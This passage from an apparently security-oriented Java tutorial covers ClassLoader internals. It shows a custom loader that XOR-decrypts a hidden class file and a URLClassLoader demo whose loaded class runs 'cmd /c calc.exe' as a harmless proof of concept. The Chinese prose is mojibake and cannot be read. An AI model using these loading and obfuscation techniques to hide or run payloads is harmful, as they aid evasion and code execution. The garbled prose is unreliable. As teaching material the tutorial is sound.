function">defineClass</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> b<span class="token punctuation">,</span> off<span class="token punctuation">,</span> len<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><h3 id="5„ÄÅresolveClassÔºöÈìæÊé•ÊåáÂÆöJavaÁ±ª"><a href="#5„ÄÅresolveClassÔºöÈìæÊé•ÊåáÂÆöJavaÁ±ª" class="headerlink" title="5„ÄÅresolveClassÔºöÈìæÊé•ÊåáÂÆöJavaÁ±ª"></a>5„ÄÅresolveClassÔºöÈìæÊé•ÊåáÂÆöJavaÁ±ª</h3><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">resolveClass</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">resolveClass0</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">native</span> <span class="token keyword">void</span> <span class="token function">resolveClass0</span><span class="token punctuation">(</span><span class="token class-name">Class</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®ËøáÁ®ã"><a href="#Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®ËøáÁ®ã" class="headerlink" title="Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®ËøáÁ®ã"></a>Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®ËøáÁ®ã</h2><p>Âõ†‰∏∫Âú®ÂÆûÈôÖÂ∫îÁî®ËøáÁ®ã‰∏≠ÔºåÊàë‰ª¨‰∏ç‰ªÖ‰ªÖÂè™Â∏åÊúõ‰ΩøÁî®classpathÂΩì‰∏≠ÊåáÂÆöÁöÑÁ±ªÊàñËÄÖjarÂåÖËøõË°åË∞ÉÁî®‰ΩøÁî®ÔºåÊàë‰ª¨ÊúâÊó∂Â∏åÊúõË∞ÉÁî®Êú¨Âú∞Á£ÅÁõòÊñá‰ª∂ÊàñËÄÖÁΩëÁªúËøòÂèØ‰ª•‰ΩøÁî®Ëá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®ÁöÑÊñπÂºè„ÄÇ</p><p>Âú®‰∏äÈù¢loadClassÊñπÊ≥ïÂàÜÊûê‰∏≠Ôºå‰ªñÂÜÖÈÉ®ÂÖ∂ÂÆûÊòØË∞ÉÁî®findClass(String) ÊñπÊ≥ïÊù•Ë£ÖËΩΩÁ±ªÔºåÊâÄ‰ª•Êàë‰ª¨Ë¶ÅÊÉ≥Âä†ËΩΩËá™Â∑±Ëá™ÂÆö‰πâÁöÑÁ±ªÔºåÂ∞±ÊòØË¶ÜÁõñËøô‰∏™findClass(String) ÊñπÊ≥ïÔºåËÄå‰∏çÊòØloadClassÊñπÊ≥ï„ÄÇ</p><p>‰ª•‰∏ãÂ∞±ÊòØËá™ÂÆö‰πâÁ±ªÂä†ËΩΩÂô®Ê≠•È™§Ôºö</p><p>1„ÄÅÁªßÊâøClassLoaderÁ±ª</p><p>2„ÄÅË¶ÜÁõñfindClass()ÊñπÊ≥ï</p><p>3„ÄÅÂú®findClass()ÊñπÊ≥ï‰∏≠Ë∞ÉÁî®defineClass()ÊñπÊ≥ï</p><p>ËøôÈáåÊàë‰ª¨ÂÄüÂä©‰∏Ä‰∏™Âä†ÂØÜjavaÁ±ªÂ≠óËäÇÁ†Å‰æãÂ≠êÊù•ËÆ≤Ëß£„ÄÇ</p><p>ËøôÈáåÊàë‰ª¨ÂÖàÂàõÂª∫‰∏Ä‰∏™CypherTest.javaÊñá‰ª∂ÔºåÁÑ∂Âêé‰ΩøÁî®java -d . CypherTest.javaÔºåÁÑ∂ÂêéÂ∞±ËÉΩÁîüÊàêCypherTest.classÊñá‰ª∂‰∫Ü„ÄÇ</p><p>CypherTest.javaÊñá‰ª∂</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">CypherTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This experiment test is successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÁõÆÂΩï‰∏ãÁîüÊàê‰∫ÜCypherTest.classÊñá‰ª∂„ÄÇ</p><p><img src="9.png" loading="lazy"></p><p>‰πãÂêéÊàë‰ª¨ÁºñÂÜô‰∏Ä‰∏™Âä†ÂØÜÁ±ªEncryptionÔºå‰ΩøÁî®ÁÆÄÂçïÁöÑÈÄê‰ΩçÂèñÂèçËøõË°åÂä†ÂØÜÊìç‰Ωú„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Encryption</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">encode</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/usr/local/com/test/CypherTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token comment">// Ëé∑ÂèñË∑ØÂæÑCypherTest.classÊñá‰ª∂</span>                <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token string">"/usr/local/temp/com/test/CypherTest.class"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ‰∏∫‰∫Ü‰øùÊåÅ‰∏ÄËá¥ÔºåÂàõÂª∫‰∫Ü‰∏Ä‰∏™Á©∫ÁöÑtempÁõÆÂΩï</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">encode</span><span class="token punctuation">(</span><span class="token class-name">File</span> src<span class="token punctuation">,</span> <span class="token class-name">File</span> dest<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FileInputStream</span> fis <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            fis <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>src<span class="token punctuation">)</span><span class="token punctuation">;</span>            fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// ÈÄê‰ΩçÂèñÂèçÊìç‰Ωú</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> fis<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ËØªÂèñ‰∏Ä‰∏™Â≠óËäÇ</span>                fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// ÂèñÂèçËæìÂá∫</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ÂÖ≥Èó≠Êï∞ÊçÆÊµÅ</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>fis <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fis<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    fos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"This experiment test is successful"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>‰πãÂêéÊàë‰ª¨ÁúãÂà∞ÁîüÊàê‰∫ÜÂä†ÂØÜÂêéÊñ∞ÁöÑCypherTest.classÊñá‰ª∂„ÄÇ</p><p><img src="10.png" loading="lazy"></p><p>Âõ†‰∏∫Ëøô‰∏™ÊòØËá™ÂÆö‰πâÂä†ÂØÜÂêéÔºåÊàë‰ª¨Êó†Ê≥ï‰ΩøÁî®Â∑•ÂÖ∑Áõ¥Êé•ËøõË°åÂèçÁºñËØëÊìç‰ΩúÂíåÁõ¥Êé•‰ΩøÁî®jvmÈªòËÆ§Á±ªÂä†ËΩΩÂô®Âéª‰ΩøÁî®ÂÆÉ„ÄÇ</p><p>‰πãÂêéÊàë‰ª¨ÂÜçÁºñÂÜô‰∏Ä‰∏™DectyptionËß£ÂØÜÁ±ªÔºåÂØπÊñ∞Âä†ÂØÜÁöÑCypherTest.classËøõË°åËß£ÂØÜÊìç‰Ωú„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Decryption</span> <span class="token keyword">extends</span> <span class="token class-name">ClassLoader</span> <span class="token punctuation">&#123;</span> <span class="token comment">// ÁªßÊâøClassLoaderÁ±ª</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> rootDir<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token class-name">Decryption</span><span class="token punctuation">(</span><span class="token class-name">String</span> rootDir<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>rootDir <span class="token operator">=</span> rootDir<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span> <span class="token comment">// ÈáçÂÜôË¶ÜÁõñfindClass</span>    <span class="token keyword">protected</span> <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> <span class="token function">findClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> c <span class="token operator">=</span> <span class="token function">findLoadedClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> c<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">ClassLoader</span> parent <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getParent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                c <span class="token operator">=</span> parent<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// System.out.println("Áà∂Á±ªÊó†Ê≥ïÂä†ËΩΩ‰Ω†ÁöÑclassÔºåÊäõÂá∫ClassNotFoundException,Â∑≤ÊçïËé∑ÔºåÁªßÁª≠ËøêË°å");</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>c <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Áà∂Á±ªÊàêÂäüÂä†ËΩΩ"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> c<span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token comment">// ËØªÂèñÊñá‰ª∂ ËΩ¨ÂåñÊàêÂ≠óËäÇÊï∞ÁªÑ</span>                <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> classData <span class="token operator">=</span> <span class="token function">getClassData</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>classData <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ClassNotFoundException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token comment">// Ë∞ÉÁî®defineClass()ÊñπÊ≥ï</span>                    c <span class="token operator">=</span> <span class="token function">defineClass</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> classData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> classData<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">return</span> c<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getClassData</span><span class="token punctuation">(</span><span class="token class-name">String</span> className<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> path <span class="token operator">=</span> rootDir <span class="token operator">+</span> <span class="token string">"/"</span> <span class="token operator">+</span> className<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token char">'.'</span><span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">".class"</span><span class="token punctuation">;</span>        <span class="token comment">// Â∞ÜÊµÅ‰∏≠ÁöÑÊï∞ÊçÆËΩ¨Êç¢‰∏∫Â≠óËäÇÊï∞ÁªÑ</span>        <span class="token class-name">InputStream</span> is <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            is <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buffer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> is<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp <span class="token operator">^</span> <span class="token number">0xff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> baos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>is <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    is<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>baos <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                    baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ËøôÈáåÊàë‰ª¨‰ΩøÁî®Â∞ÜDecryptionÁªßÊâøClassLoaderÁ±ªÔºå‰πãÂêéË¶ÜÁõñfindClass()ÊñπÊ≥ïÔºåÂπ∂‰∏îÂú®findClass()ÊñπÊ≥ï‰∏≠Ë∞ÉÁî®defineClass()ÊñπÊ≥ï‰ΩøÁî®ÔºåÊúÄÂêéÂä†ËΩΩÊàë‰ª¨Ëá™ÂÆö‰πâÁöÑgetClassDataÊñπÊ≥ïÂéªËøõË°åËß£ÂØÜÊìç‰Ωú„ÄÇ</p><p>ÊúÄÂêéÊàë‰ª¨‰ΩøÁî®‰∏Ä‰∏™DemoËøõË°åÊµãËØïÔºåÂéªÊü•ÁúãÂΩìÂâçÁ±ªÂä†ËΩΩÂô®Êú∫Âà∂ÁöÑÊÉÖÂÜµ„ÄÇÂ¶ÇÊûúÊàë‰ª¨ÊÉ≥Ë¶ÅËé∑ÂèñÂÖ∂ËæìÂá∫ÁöÑSystem.out.printlnËØ≠Âè•ÔºåÈúÄË¶ÅÂèçÂ∞ÑÊú∫Âà∂ÂéªÂÆûÁé∞„ÄÇËøôÁØáÊñáÁ´†Êàë‰ª¨Âè™Â≠¶‰π†ClassLoaderÁ±ªÂ∫îÁî®ÔºåÂ∞±‰∏çÂéªÊ∂âÂèäÂÖ∂‰ªñÁü•ËØÜÁÇπÔºåËé∑ÂèñÂÖ∂Á±ªÂä†ËΩΩÂô®Êü•ÁúãÂç≥ÂèØ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>testCypher</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Decryption</span> deLoader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Decryption</span><span class="token punctuation">(</span><span class="token string">"/usr/local/temp/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Ëß£ÂØÜÂä†ËΩΩÂô®</span>        <span class="token class-name">Class</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token operator">?</span><span class="token punctuation">></span></span> t1 <span class="token operator">=</span> deLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"com.test.CypherTest"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// Âä†ËΩΩÂ∑≤Âä†ÂØÜÁöÑÁ±ª</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"c3 ÁöÑClassÊòØ  "</span> <span class="token operator">+</span> t1<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><img src="11.png" loading="lazy"></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>Èô§‰∫Ü‰∏äËø∞Ëá™ÂÆö‰πâClassLoaderÁ±ªÔºåÊàë‰ª¨ËøòÂèØ‰ª•Â≠¶‰π†URLClassLoader„ÄÇURLClassLoaderÁ±ªÁªßÊâøClassLoaderÁ±ªÔºåÂèØ‰ª•Âä†ËΩΩÊú¨Âú∞Á£ÅÁõòÂíåÁΩëÁªú‰∏≠ÁöÑjarÂåÖÁ±ªÊñá‰ª∂„ÄÇ</p><h3 id="1-Êú¨Âú∞Á£ÅÁõòclassÊñá‰ª∂Ë∞ÉÁî®"><a href="#1-Êú¨Âú∞Á£ÅÁõòclassÊñá‰ª∂Ë∞ÉÁî®" class="headerlink" title="1. Êú¨Âú∞Á£ÅÁõòclassÊñá‰ª∂Ë∞ÉÁî®"></a>1. Êú¨Âú∞Á£ÅÁõòclassÊñá‰ª∂Ë∞ÉÁî®</h3><p>È¶ñÂÖàÊàëÂú®DÁõòÂàõÂª∫‰∫Ü‰∏Ä‰∏™Test.javaÊñá‰ª∂ÔºåÂÜô‰∫Ü‰∏ÄÊÆµcalc.exeËÆ°ÁÆóÊú∫ÂºπÁ™ó‰ª£Á†Å„ÄÇÂ¶ÇÊûúÊñá‰ª∂Ë¢´ÊàêÂäüËß£ÊûêÊâßË°åÔºå‰ºöËæìÂá∫Test successÂ≠óÊÆµ‰∏îÂºπÂá∫ËÆ°ÁÆóÂô®„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>test</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Test success!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span><span class="token punctuation">&#123;</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"cmd /c calc.exe"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>         <span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>ÁÑ∂Âêé‰ΩøÁî®javacËøõË°åÁºñËØëÔºåÂú®DÁõòÁîüÊàêÂØπÂ∫îÁöÑclassÊñá‰ª∂„ÄÇ</p><p><img src="12.png" loading="lazy"></p><p>‰πãÂêéÊàë‰ª¨ÂÜç‰øÆÊîπClassLoaderTestÁ±ªÔºåÂà©Áî®URLClassLoaderÊñπÂºèÂéªËé∑ÂèñDÁõò‰∏≠Test.classÊñá‰ª∂„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span></span><span class="token class-name">Classloader</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URI</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URL</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ClassLoaderTest</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token 